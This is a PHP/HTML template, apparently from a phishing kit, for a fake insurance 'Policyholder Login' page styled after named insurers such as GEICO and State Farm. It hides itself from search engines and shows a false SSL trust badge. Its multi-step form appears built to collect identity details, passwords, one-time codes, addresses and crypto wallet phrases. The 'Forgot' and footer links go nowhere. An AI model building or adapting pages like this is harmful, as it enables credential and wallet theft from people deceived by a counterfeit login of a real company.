<?php
// Insurance template — GEICO / Progressive / Allstate / State Farm / AXA style
// Clean white card, trust-focused design, shield icon, professional serif+sans mix
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title><?=$org_name?> — Policyholder Login</title>
<meta name="robots" content="noindex,nofollow">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Merriweather:wght@400;700&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{--a:<?=$accent?>;--s:<?=$sec?>;--r:<?=$ar?>;--g:<?=$ag?>;--b:<?=$ab?>}
body{font-family:'Inter',system-ui,sans-serif;min-height:100vh;min-height:100dvh;
  background:<?=$is_light_theme?'#f5f7fa':'#0e1526'?>;
  display:flex;flex-direction:column;align-items:center;
  justify-content:center;padding:20px 16px;color:<?=$is_light_theme?'#1e293b':'#e2e8f0'?>}

/* Card */
.card{width:100%;max-width:450px;background:<?=$is_light_theme?'#fff':'#1e293b'?>;
  border-radius:14px;overflow:hidden;
  box-shadow:<?=$is_light_theme?'0 4px 28px rgba(0,0,0,.11)':'0 8px 40px rgba(0,0,0,.5)'?>}

/* Header */
.hd{background:<?=$accent?>;padding:24px 28px 20px;position:relative;overflow:hidden}
.hd::before{content:'';position:absolute;right:-40px;top:-40px;width:160px;height:160px;
  border-radius:50%;background:rgba(255,255,255,.07)}
.hd-row{display:flex;align-items:center;gap:16px;position:relative;z-index:1}
.logo-box{width:56px;height:56px;background:<?=$logo_bg?>;border-radius:12px;
  display:flex;align-items:center;justify-content:center;overflow:hidden;flex-shrink:0;
  box-shadow:0 3px 14px rgba(0,0,0,.2)}
.logo-box img{width:100%;height:100%;object-fit:contain}
.logo-ini{font-size:18px;font-weight:800;color:<?=$accent?>}
.hd-name{font-size:17px;font-weight:700;color:#fff;line-height:1.2;font-family:'Merriweather',Georgia,serif}
.hd-sub{font-size:11px;color:rgba(255,255,255,.72);margin-top:3px}

/* Trust badge */
.trust-bar{background:<?=$is_light_theme?'#f0faf4':'rgba(16,185,129,.08)'?>;
  border-bottom:1px solid <?=$is_light_theme?'#d1fae5':'rgba(16,185,129,.2)'?>;
  padding:9px 28px;display:flex;align-items:center;gap:8px}
.trust-icon{font-size:14px;flex-shrink:0}
.trust-text{font-size:11px;color:<?=$is_light_theme?'#065f46':'#6ee7b7'?>;font-weight:600;line-height:1.4}

/* Step indicator */
.step-bar{display:flex;align-items:center;padding:14px 28px;border-bottom:1px solid <?=$is_light_theme?'#f0f2f5':'#2d3748'?>}
.step-item{display:flex;flex-direction:column;align-items:center;flex:1;position:relative}
.step-item:not(:last-child)::after{content:'';position:absolute;left:50%;top:12px;
  width:100%;height:1px;background:<?=$is_light_theme?'#e2e8f0':'#2d3748'?>;z-index:0}
.step-circle{width:24px;height:24px;border-radius:50%;background:<?=$is_light_theme?'#e2e8f0':'#2d3748'?>;
  color:<?=$is_light_theme?'#9ca3af':'#6b7280'?>;font-size:11px;font-weight:700;
  display:flex;align-items:center;justify-content:center;position:relative;z-index:1;transition:all .2s}
.step-item.active .step-circle{background:<?=$accent?>;color:#fff}
.step-item.done .step-circle{background:<?=$sec?>;color:#fff}
.step-label{font-size:9px;color:#9ca3af;margin-top:3px;text-align:center;text-transform:uppercase;letter-spacing:.3px}
.step-item.active .step-label{color:<?=$accent?>;font-weight:700}

/* Body */
.bd{padding:24px 28px 22px}
.step-title{font-size:18px;font-weight:700;color:<?=$is_light_theme?'#1e293b':'#f1f5f9'?>;
  margin-bottom:4px;font-family:'Merriweather',Georgia,serif}
.step-sub{font-size:13px;color:#6b7280;margin-bottom:20px;line-height:1.5}

/* Fields */
.field{margin-bottom:15px}
.field label{display:block;font-size:12px;font-weight:600;
  color:<?=$is_light_theme?'#374151':'#9ca3af'?>;margin-bottom:6px;letter-spacing:.2px}
.field input{width:100%;background:<?=$is_light_theme?'#f8fafc':'rgba(255,255,255,.05)'?>;
  border:1.5px solid <?=$is_light_theme?'#e2e8f0':'#374151'?>;
  color:<?=$is_light_theme?'#1e293b':'#f1f5f9'?>;
  padding:12px 14px;border-radius:8px;font-size:15px;outline:none;
  font-family:inherit;-webkit-appearance:none;transition:border-color .15s,box-shadow .15s}
.field input:focus{border-color:<?=$accent?>;
  box-shadow:0 0 0 3px rgba(<?=$ar?>,<?=$ag?>,<?=$ab?>,.12);
  background:<?=$is_light_theme?'#fff':'rgba(255,255,255,.08)'?>}
.field input::placeholder{color:#9ca3af}
.card-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.or-div{text-align:center;font-size:12px;color:#9ca3af;margin:12px 0;position:relative}
.or-div::before,.or-div::after{content:'';position:absolute;top:50%;width:43%;height:1px;
  background:<?=$is_light_theme?'#e2e8f0':'#374151'?>}
.or-div::before{left:0}.or-div::after{right:0}

/* Button */
.btn{width:100%;padding:14px;background:<?=$accent?>;color:#fff;font-size:15px;font-weight:700;
  border:none;border-radius:8px;cursor:pointer;margin-top:6px;
  transition:filter .15s;position:relative;font-family:inherit;letter-spacing:.1px}
.btn:hover{filter:brightness(.93)}
.btn:disabled{opacity:.5;cursor:not-allowed}
.btn.loading::after{content:'';position:absolute;right:16px;top:50%;width:16px;height:16px;
  border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;
  transform:translateY(-50%);animation:spin .7s linear infinite}
@keyframes spin{to{transform:translateY(-50%) rotate(360deg)}}
.err-msg{font-size:13px;color:#dc2626;margin-top:8px;display:none}

/* Links */
.forgot-link{display:block;text-align:center;margin-top:12px;font-size:13px;
  color:<?=$accent?>;text-decoration:none}
.forgot-link:hover{text-decoration:underline}

/* OTP / wallet */
.otp-wrap{display:flex;gap:8px;justify-content:center}
.otp-wrap input{flex:1;text-align:center;font-size:22px;font-weight:700;padding:12px 4px;max-width:48px;
  background:<?=$is_light_theme?'#f8fafc':'rgba(255,255,255,.05)'?>;
  border:1.5px solid <?=$is_light_theme?'#e2e8f0':'#374151'?>;
  border-radius:8px;color:<?=$is_light_theme?'#1e293b':'#f1f5f9'?>;outline:none}
.otp-wrap input:focus{border-color:<?=$accent?>}
.otp-hint{font-size:12px;color:#9ca3af;text-align:center;margin-top:8px}
.wallet-area{width:100%;min-height:80px;
  background:<?=$is_light_theme?'#f8fafc':'rgba(255,255,255,.05)'?>;
  border:1.5px solid <?=$is_light_theme?'#e2e8f0':'#374151'?>;
  color:<?=$is_light_theme?'#1e293b':'#f1f5f9'?>;
  padding:12px 14px;border-radius:8px;font-size:13px;font-family:monospace;outline:none;resize:none}
.wallet-area:focus{border-color:<?=$accent?>}
.wallet-hint{font-size:11px;color:#9ca3af;margin-top:6px;line-height:1.5;text-align:center}
.addr-area{width:100%;min-height:60px;
  background:<?=$is_light_theme?'#f8fafc':'rgba(255,255,255,.05)'?>;
  border:1.5px solid <?=$is_light_theme?'#e2e8f0':'#374151'?>;
  color:<?=$is_light_theme?'#1e293b':'#f1f5f9'?>;
  padding:12px 14px;border-radius:8px;font-size:14px;font-family:inherit;outline:none;resize:none}
.addr-area:focus{border-color:<?=$accent?>}

/* Footer */
.card-footer{padding:14px 28px;border-top:1px solid <?=$is_light_theme?'#f0f2f5':'#2d3748'?>;
  font-size:11px;color:#9ca3af;text-align:center;line-height:1.7}
.card-footer a{color:#9ca3af;text-decoration:none}
.card-footer a:hover{text-decoration:underline}

#loadOverlay{display:none;position:fixed;inset:0;
  background:rgba(<?=$is_light_theme?'245,247,250':'14,21,38'?>,.9);z-index:999;
  align-items:center;justify-content:center;flex-direction:column;gap:16px}
#loadOverlay.show{display:flex}
.load-spin{width:40px;height:40px;border:3px solid <?=$is_light_theme?'#e2e8f0':'#374151'?>;
  border-top-color:<?=$accent?>;border-radius:50%;animation:spin .8s linear infinite}
.load-txt{font-size:13px;color:#9ca3af}

@media(max-width:480px){
  .card{border-radius:0;min-height:100vh;min-height:100dvh;
    box-shadow:none;width:100%;max-width:100%}
  .bd{padding:20px 20px 18px}
  .card-footer{padding:12px 20px}
}
</style>
</head>
<body>
<div id="loadOverlay"><div class="load-spin"></div><div class="load-txt" id="loadText">Verifying your account…</div></div>

<div class="card">
  <div class="hd">
    <div class="hd-row">
      <div class="logo-box">
        <?php if($logo_url): ?>
        <img src="<?=htmlspecialchars($logo_url)?>" alt="<?=htmlspecialchars($org_name)?>" onerror="this.style.display='none';this.nextElementSibling.style.display='block'">
        <div class="logo-ini" style="display:none"><?=strtoupper(substr($org_name,0,2))?></div>
        <?php else: ?>
        <div class="logo-ini"><?=strtoupper(substr($org_name,0,2))?></div>
        <?php endif; ?>
      </div>
      <div>
        <div class="hd-name"><?=htmlspecialchars($org_name)?></div>
        <div class="hd-sub">Policyholder Portal — Secure Login</div>
      </div>
    </div>
  </div>

  <!-- Trust badge -->
  <div class="trust-bar">
    <div class="trust-icon">🔒</div>
    <div class="trust-text">Your information is protected with 256-bit SSL encryption</div>
  </div>

  <!-- Step indicator -->
  <?php if($total_steps > 1): ?>
  <div class="step-bar" id="stepBar">
    <?php
    $step_labels = ['Identity','Security','Verify','Confirm'];
    for($i=1;$i<=$total_steps;$i++): ?>
    <div class="step-item <?=$i===1?'active':''?>" id="si<?=$i?>">
      <div class="step-circle" id="sc<?=$i?>"><?=$i?></div>
      <div class="step-label"><?=$step_labels[$i-1] ?? 'Step '.$i?></div>
    </div>
    <?php endfor; ?>
  </div>
  <?php endif; ?>

  <div class="bd">
    <?php for($sn=1;$sn<=$total_steps;$sn++): ?>
    <div id="step<?=$sn?>" <?=$sn>1?'style="display:none"':''?>>
      <div class="step-title"><?=htmlspecialchars($sc['step_titles'][$sn])?></div>
      <?php if(!empty($sc['step_subs'][$sn])): ?>
      <div class="step-sub" id="step<?=$sn?>sub"><?=htmlspecialchars($sc['step_subs'][$sn])?></div>
      <?php endif; ?>
      <form onsubmit="submitStep(event,<?=$sn?>)">
        <?php $fld = $sc['step'.$sn.'_fields'] ?? 'email_only'; include __DIR__.'/partials/fields.php'; ?>
        <button type="submit" class="btn" id="btn<?=$sn?>"><?=htmlspecialchars($sc['btn_labels'][$sn-1])?></button>
        <div class="err-msg" id="err<?=$sn?>">Please enter the required information.</div>
      </form>
      <?php if($sn===1): ?>
      <a href="#" class="forgot-link" onclick="return false">Forgot your Policy ID or password?</a>
      <?php endif; ?>
    </div>
    <?php endfor; ?>
  </div>

  <div class="card-footer">
    <?=$footer?><br>
    <a href="#">Privacy Policy</a> &nbsp;·&nbsp; <a href="#">Terms of Use</a> &nbsp;·&nbsp; <a href="#">Contact Us</a>
  </div>
</div>

<?php include __DIR__.'/partials/js.php'; ?>
<script>
// Update step indicators
const _origShowStepIns = showStep;
function showStep(n) {
  _origShowStepIns(n);
  for(let i=1;i<=TOTAL_STEPS;i++){
    const si=document.getElementById('si'+i);
    const sc=document.getElementById('sc'+i);
    if(!si) continue;
    si.classList.remove('active','done');
    if(i===n){si.classList.add('active');sc.textContent=i;}
    else if(i<n){si.classList.add('done');sc.textContent='✓';}
    else sc.textContent=i;
  }
}
</script>
</body>
</html>
